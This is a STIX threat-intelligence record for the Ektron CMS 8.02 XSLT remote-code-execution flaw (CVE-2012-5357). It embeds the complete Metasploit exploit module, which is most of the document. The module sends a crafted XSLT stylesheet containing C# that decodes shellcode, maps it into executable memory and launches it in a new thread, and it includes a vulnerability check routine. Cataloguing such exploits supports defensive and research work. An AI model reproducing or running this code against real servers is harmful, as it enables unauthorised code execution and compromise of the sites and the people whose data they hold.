{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2afd09bb-bee4-4efe-a456-08502f21d257",
    "created": "2024-08-14T16:55:43.885944Z",
    "modified": "2024-08-14T16:55:43.885948Z",
    "name": "Ektron 8.02 XSLT Transform Remote Code Execution",
    "description": " This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The vulnerability exists due to the insecure usage of XslCompiledTransform, using a XSLT controlled by the user. The module has been tested successfully on Ektron CMS 8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK SERVICE privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ektron_xslt_exec.rb",
            "external_id": "ektron_xslt_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5357"
        },
        {
            "source_name": "reference",
            "url": "http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/msvr/msvr12-016"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ektron 8.02 XSLT Transform Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The\n        vulnerability exists due to the insecure usage of XslCompiledTransform, using a\n        XSLT controlled by the user. The module has been tested successfully on Ektron CMS\n        8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK\n        SERVICE privileges.\n      },\n      'Author'         => [\n        'Rich Lundeen', # Vulnerability discovery\n        'juan vazquez', # Metasploit module\n        'Nicolas \"Nicob\" Gregoire' # C# code using VirtualAlloc + copy shellcode + CreateThread\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-5357'],\n          [ 'OSVDB', '88107' ],\n          [ 'URL', 'http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/' ],\n          [ 'URL', 'http://technet.microsoft.com/en-us/security/msvr/msvr12-016' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Windows 2003 SP2 / Ektron CMS400 8.02', { }],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-10-16'\n    ))\n\n    register_options(\n      [\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the VBS payload request', 60]),\n        OptString.new('TARGETURI', [true, 'The URI path of the Ektron CMS', '/cms400min/'])\n      ])\n  end\n\n  def check\n\n    fingerprint = rand_text_alpha(5 + rand(5))\n    xslt_data = <<-XSLT\n<?xml version='1.0'?>\n<xsl:stylesheet version=\"1.0\"\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"http://mycompany.com/mynamespace\">\n<msxsl:script language=\"C#\" implements-prefix=\"user\">\n<![CDATA[\npublic string xml()\n{\nreturn \"#{fingerprint}\";\n}\n]]>\n</msxsl:script>\n<xsl:template match=\"/\">\n<xsl:value-of select=\"user:xml()\"/>\n</xsl:template>\n</xsl:stylesheet>\n    XSLT\n\n    res = send_request_cgi(\n      {\n        'uri'     => \"#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx\",\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"application/x-www-form-urlencoded; charset=UTF-8\",\n        'headers' => {\n          \"Referer\" => build_referer\n        },\n        'vars_post'    => {\n          \"xml\" => rand_text_alpha(5 + rand(5)),\n          \"xslt\" => xslt_data\n        }\n      })\n\n    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def uri_path\n    uri_path = target_uri.path\n    uri_path << \"/\" if uri_path[-1, 1] != \"/\"\n    uri_path\n  end\n\n  def build_referer\n    if datastore['SSL']\n      schema = \"https://\"\n    else\n      schema = \"http://\"\n    end\n\n    referer = schema\n    referer << rhost\n    referer << \":#{rport}\"\n    referer << uri_path\n    referer\n  end\n\n  def exploit\n\n    print_status(\"Generating the EXE Payload and the XSLT...\")\n    fingerprint = rand_text_alpha(5 + rand(5))\n\n    xslt_data = <<-XSLT\n<?xml version='1.0'?>\n<xsl:stylesheet version=\"1.0\"\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"http://mycompany.com/mynamespace\">\n<msxsl:script language=\"C#\" implements-prefix=\"user\">\n<![CDATA[\n\nprivate static UInt32 MEM_COMMIT = 0x1000;\nprivate static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n[System.Runtime.InteropServices.DllImport(\"kernel32\")]\nprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n[System.Runtime.InteropServices.DllImport(\"kernel32\")]\nprivate static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\npublic string xml()\n{\n  string shellcode64 = @\"#{Rex::Text.encode_base64(payload.encoded)}\";\n  byte[] shellcode = System.Convert.FromBase64String(shellcode64);\n  UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n  System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);\n  IntPtr hThread = IntPtr.Zero;\n  IntPtr pinfo = IntPtr.Zero;\n  UInt32 threadId = 0;\n  hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n  return \"#{fingerprint}\";\n}\n]]>\n</msxsl:script>\n<xsl:template match=\"/\">\n<xsl:value-of select=\"user:xml()\"/>\n</xsl:template>\n</xsl:stylesheet>\n    XSLT\n\n    print_status(\"Trying to run the xslt transformation...\")\n    res = send_request_cgi(\n      {\n        'uri'     => \"#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx\",\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"application/x-www-form-urlencoded; charset=UTF-8\",\n        'headers' => {\n          \"Referer\" => build_referer\n        },\n        'vars_post'    => {\n          \"xml\" => rand_text_alpha(5 + rand(5)),\n          \"xslt\" => xslt_data\n        }\n      })\n    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/\n      print_good(\"Exploitation was successful\")\n    else\n      fail_with(Failure::Unknown, \"There was an unexpected response to the xslt transformation request\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-16",
    "x_mitre_platforms": [
        "win'"
    ]
}